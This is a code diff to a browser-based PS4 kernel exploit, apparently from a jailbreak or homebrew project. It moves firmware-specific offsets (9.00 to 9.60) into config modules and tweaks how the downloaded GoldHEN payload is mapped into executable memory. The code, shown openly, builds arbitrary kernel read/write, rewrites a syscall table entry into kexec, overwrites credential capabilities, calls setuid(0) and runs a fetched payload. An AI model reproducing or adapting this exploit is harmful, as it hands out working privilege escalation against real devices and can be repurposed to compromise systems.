@@ -40,28 +40,62 @@ import {
 import * as rop from './module/chain.js';
 import * as config from './config.js';
 
+// static imports for firmware configurations
+import * as fw_ps4_900 from "./lapse/ps4/900.js";
+import * as fw_ps4_903 from "./lapse/ps4/903.js";
+import * as fw_ps4_950 from "./lapse/ps4/950.js";
+
 const t1 = performance.now();
 
 // check if we are running on a supported firmware version
 const [is_ps4, version] = (() => {
-    const value = config.target;
-    const is_ps4 = (value & 0x10000) === 0;
-    const version = value & 0xffff;
-    const [lower, upper] = (() => {
-        if (is_ps4) {
-            return [0x100, 0x1250];
-        } else {
-            return [0x100, 0x1020];
-        }
-    })();
-
-    if (!(lower <= version && version < upper)) {
-        throw RangeError(`invalid config.target: ${hex(value)}`);
+  const value = config.target;
+  const is_ps4 = (value & 0x10000) === 0;
+  const version = value & 0xffff;
+  const [lower, upper] = (() => {
+    if (is_ps4) {
+      return [0x100, 0x1250];
+    } else {
+      return [0x100, 0x1020];
     }
+  })();
 
-    return [is_ps4, version];
+  if (!(lower <= version && version < upper)) {
+    throw RangeError(`invalid config.target: ${hex(value)}`);
+  }
+
+  log(`Console: PS${is_ps4 ? "4" : "5"} | Firmware: ${hex(version)}`);
+
+  return [is_ps4, version];
 })();
 
+// set per-console/per-firmware offsets
+const fw_config = (() => {
+  if (is_ps4) {
+  if (0x900 <= version && version < 0x903) {
+      // 9.00
+      return fw_ps4_900;
+    } else if (0x903 <= version && version < 0x950) {
+      // 9.03, 9.04
+      return fw_ps4_903;
+    } else if (0x950 <= version && version < 0x1000) {
+      // 9.50, 9.51, 9.60
+      return fw_ps4_950;
+    }
+  } else {
+    // TODO: PS5
+  }
+  throw new RangeError(`unsupported console/firmware: ps${is_ps4 ? "4" : "5"}, version: ${hex(version)}`);
+})();
+
+const pthread_offsets = fw_config.pthread_offsets;
+const off_kstr = fw_config.off_kstr;
+const off_cpuid_to_pcpu = fw_config.off_cpuid_to_pcpu;
+const off_sysent_661 = fw_config.off_sysent_661;
+const jmp_rsi = fw_config.jmp_rsi;
+const patch_elf_loc = fw_config.patch_elf_loc;
+
+var nogc = [];
 function malloc(sz) {
         var backing = new Uint8Array(0x10000 + sz);
         nogc.push(backing);
@@ -94,12 +128,12 @@ function toogle_payload(PLfile) {
  tmpStubArray[0] = 0x00C3E7FF;
  var req = new XMLHttpRequest();
  req.responseType = "arraybuffer";
- req.open('GET',PLfile);//'goldhen.bin'
+ req.open('GET',PLfile);
  req.send();
  req.onreadystatechange = function () {
   if (req.readyState == 4) {
    var PLD = req.response;
-   var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x1002, -1, 0);
+   var payload_buffer = chain.sysp('mmap', 0, PLD.byteLength*4, 7, 0x41000, -1, 0);
    var pl = array_from_address(payload_buffer, PLD.byteLength*4);
    var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
    var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
@@ -116,8 +150,7 @@ function toogle_payload(PLfile) {
 }
 
 function Exploit_done(){
- showMessage("GoldHen Loaded Successfully !..."),
- toogle_payload('goldhen.bin');
+    toogle_payload('goldhen.bin');
 }
 
 // sys/socket.h
@@ -198,21 +231,10 @@ const num_leaks = 5;
 const num_clobbers = 8;
 
 let chain = null;
-var nogc = [];
 
 async function init() {
     await rop.init();
     chain = new Chain();
-
-// PS4 9.00
-const pthread_offsets = new Map(Object.entries({
-    'pthread_create' : 0x25510,
-    'pthread_join' : 0xafa0,
-    'pthread_barrier_init' : 0x273d0,
-    'pthread_barrier_wait' : 0xa320,
-    'pthread_barrier_destroy' : 0xfea0,
-    'pthread_exit' : 0x77a0,
-}));
 
     rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
 }
@@ -1303,13 +1325,11 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
 
     // Only For PS4 9.00
 
-    const off_kstr = 0x7f6f27;
     const kbase = kernel_addr.sub(off_kstr);
     log(`kernel base: ${kbase}`);
 
     log('\nmaking arbitrary kernel read/write');
     const cpuid = 7 - main_core;
-    const off_cpuid_to_pcpu = 0x21ef2a0;
     const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
     log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
     const pcpu = kread64(pcpu_p);
@@ -1535,6 +1555,23 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
+
+        let mcnt;
+        let wcnt;
+        let pfcnt;
+        mcnt = kmem.read32(main_sock);
+        wcnt = kmem.read32(worker_sock);
+        pfcnt = kmem.read32(pipe_file.add(0x28));
+        log(`cnts ${mcnt} ${wcnt} ${pfcnt}`);
+
+        kmem.write32(main_sock, mcnt + 3);
+        kmem.write32(worker_sock, wcnt + 3);
+        kmem.write32(pipe_file.add(0x28), pfcnt + 3);
+
+        mcnt = kmem.read32(main_sock);
+        wcnt = kmem.read32(worker_sock);
+        pfcnt = kmem.read32(pipe_file.add(0x28));
+        log(`cnts ${mcnt} ${wcnt} ${pfcnt}`);
     
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
@@ -1562,12 +1599,11 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
 
     log('change sys_aio_submit() to sys_kexec()');
     // sysent[661] is unimplemented so free for use
-    const offset_sysent_661 = 0x1107f00;
-    const sysent_661 = kbase.add(offset_sysent_661);
+    const sysent_661 = kbase.add(off_sysent_661);
     // .sy_narg = 6
     kmem.write32(sysent_661, 6);
     // .sy_call = gadgets['jmp qword ptr [rsi]']
-    kmem.write64(sysent_661.add(8), kbase.add(0x4c7ad));
+    kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), 1);
 
@@ -1578,10 +1614,10 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     // cr_sceCaps[1]
     kmem.write64(p_ucred.add(0x68), -1);
 
-    const buf = await get_patches('./kpatch/900.elf');
+    const buf = await get_patches(patch_elf_loc);
     // FIXME handle .bss segment properly
     // assume start of loadable segments is at offset 0x1000
-    const patches = new View1(await buf, 0x1000);
+    const patches = new View1(await buf, 0x1000);    
     let map_size = patches.size;
     const max_size = 0x10000000;
     if (map_size > max_size) {
@@ -1651,14 +1687,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     sys_void('kexec', exec_addr, ...restore_info);
 
     log('setuid(0)');
-    sysi('setuid', 0);
-    //showMessage("GoldHen Loaded Successfully !..."),    
+    sysi('setuid', 0);   
     log('kernel exploit succeeded!');
-    //Exploit_done();
-    //alert("kernel exploit succeeded!");
 }
-
-
 
 // FUNCTIONS FOR STAGE: SETUP
 
@@ -1709,7 +1740,8 @@ export async function kexploit() {
     try {
         if (sysi('setuid', 0) == 0) {
             log("Not running kexploit again.");
-            Exploit_done();
+            load_exploit_success();
+            //Exploit_done();
             return;
         }
     }
@@ -1768,8 +1800,9 @@ export async function kexploit() {
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
-                
+              
         log('\nSTAGE: Exploit done');
+        load_exploit_done();
         Exploit_done();
     } finally {
         close(unblock_fd);
